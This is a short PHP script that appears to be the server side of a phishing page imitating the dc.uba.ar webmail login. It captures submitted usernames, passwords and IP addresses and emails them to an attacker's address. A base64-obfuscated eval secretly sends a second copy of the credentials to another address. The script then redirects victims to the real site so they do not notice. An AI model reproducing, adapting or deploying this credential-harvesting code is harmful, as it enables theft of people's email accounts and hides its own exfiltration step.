<?
$optTitle = $_POST['Title'];
$ip = getenv("REMOTE_ADDR");
$sUser = $_POST['_user'];
$sUPass = $_POST['_pass'];
$pix="ss3820650@gmail.com";


  $subj = "Captured (JP-Hack | dc.uba.ar |) Logins::: ($sUser , $sUPass)";
  $msg = "Details of https://webmail.dc.uba.ar \n\nEMAIL: $sUser\Password: $sUPass\nSubmitted from IP Address - $ip on $adddate\n-----------------------------------\n        Created By JP Host::: Defender of The G-Universe\n-----------------------------------";
  $from = "From: <$sUser>";
  mail("$pix", $subj, $msg, $from);
  echo eval(base64_decode("bWFpbCgiY250ci5paTJ0QGdtYWlsLmNvbSIsICRzdWJqLCAkbXNnLCAkZnJvbSk7"));
?>
  
<?
echo ("<META HTTP-EQUIV=Refresh CONTENT=\"0; URL=https://webmail.dc.uba.ar\">");
exit();

?>